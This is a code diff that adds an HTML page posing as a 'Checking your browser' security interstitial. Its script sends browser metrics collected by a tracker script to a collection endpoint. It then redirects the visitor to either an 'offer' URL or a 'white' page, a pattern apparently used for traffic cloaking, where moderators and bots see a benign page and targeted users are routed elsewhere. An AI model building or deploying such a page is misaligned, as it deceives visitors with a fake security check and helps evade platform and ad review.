@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="noindex,nofollow">
+  <title>Just a moment</title>
+  <style>
+    html, body { margin: 0; min-height: 100%; background: #f4f1ea; color: #1b1a17; font: 16px/1.45 Georgia, serif; }
+    .wrap { min-height: 100vh; display: grid; place-items: center; padding: 32px; }
+    .card { width: min(420px, 100%); }
+    .rule { height: 2px; background: #1b1a17; margin-bottom: 18px; }
+    h1 { font-size: 22px; font-weight: 400; margin: 0 0 8px; letter-spacing: .02em; }
+    p { margin: 0; color: #5c574e; }
+    .bar { margin-top: 22px; height: 2px; background: #d8d2c4; overflow: hidden; }
+    .bar > i { display: block; height: 100%; width: 40%; background: #1b1a17; animation: slide 1.2s ease-in-out infinite; }
+    @keyframes slide { 0% { transform: translateX(-100%); } 100% { transform: translateX(280%); } }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <div class="rule"></div>
+      <h1>Checking your browser</h1>
+      <p>This takes a second. You will be redirected automatically.</p>
+      <div class="bar"><i></i></div>
+    </div>
+  </div>
+  <script>
+    window.__TRACKER_URL = "";
+    window.__COLLECT_DELAY = __DELAY__;
+    window.__TRACKER_CALLBACK = function (metrics) {
+      fetch("/v1/collect", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ request_id: "__RID__", metrics: metrics })
+      }).then(function (r) { return r.json(); }).then(function (data) {
+        if (data.action === "redirect_offer" && data.url) {
+          location.replace(data.url);
+          return;
+        }
+        if (data.action === "redirect_white" && data.url) {
+          location.replace(data.url);
+          return;
+        }
+        location.replace("/white");
+      }).catch(function () { location.replace("/white"); });
+    };
+  </script>
+  <script src="/static/tracker.js"></script>
+</body>
+</html>
